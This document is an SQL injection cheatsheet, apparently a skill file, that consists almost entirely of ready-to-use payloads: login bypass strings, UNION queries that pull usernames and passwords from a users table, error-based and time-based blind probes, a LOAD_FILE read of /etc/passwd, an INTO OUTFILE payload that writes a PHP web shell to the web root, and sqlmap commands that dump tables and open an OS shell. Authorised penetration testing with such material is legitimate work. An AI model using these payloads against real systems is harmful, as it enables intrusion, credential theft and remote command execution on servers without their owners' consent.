---
name: cheatsheet-sqli
description: SQL injection payloads for testing, authentication bypass, and data extraction
---

# SQL Injection Cheatsheet

## Authentication Bypass
```
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
') OR ('1'='1
') OR ('1'='1'--
' UNION SELECT 1,2,3--
```

## Detection Payloads
```
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or #
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
OR 1=1
```

## UNION-Based Extraction
```sql
-- Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  (increase until error)

-- Extract data
' UNION SELECT 1,2,3--
' UNION SELECT null,null,null--
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,null,null FROM information_schema.tables--
' UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='users'--
```

## Error-Based (MySQL)
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--
```

## Time-Based Blind
```sql
' AND SLEEP(5)--           (MySQL)
' AND pg_sleep(5)--        (PostgreSQL)
'; WAITFOR DELAY '0:0:5'-- (MSSQL)
```

## File Read/Write (MySQL)
```sql
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--
```

## Automated Testing
Use `sqlmap` for automated detection and exploitation:
```bash
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target/page?id=1" -D dbname --tables
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump
sqlmap -u "http://target/page?id=1" --os-shell
```
